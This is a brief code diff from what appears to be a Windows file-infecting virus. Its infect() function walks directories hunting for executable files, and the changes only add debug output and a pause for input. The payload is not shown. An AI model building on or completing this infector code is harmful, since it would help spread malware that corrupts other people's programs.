@@ -1,5 +1,6 @@
 #include <cstdint>
 #include <iostream>
+#include <string>
 
 #include <windows.h>
 #include <winternl.h>
@@ -227,7 +228,7 @@ int infect(void)
                search_stack = reinterpret_cast<char **>(realloc(search_stack, sizeof(char *) * search_stack_size));
             
             search_stack[search_stack_size-1] = new_directory;
-            std::wcout << "\t\tIs a directory" << std::endl;
+            std::wcout << "\t\tIs a directory " << find_data.dwFileAttributes << std::endl;
          }
          else if (strnicmp(find_data.cFileName+(strlen(find_data.cFileName)-4), exeSearch, strlen(exeSearch)) == 0)
          {
@@ -236,6 +237,9 @@ int infect(void)
       } while (findNextFile(find_handle, &find_data));
 
       std::wcout << std::endl;
+
+      std::string dummyInput;
+      std::cin >> dummyInput;
 
    free_and_continue:
       free(search_string);
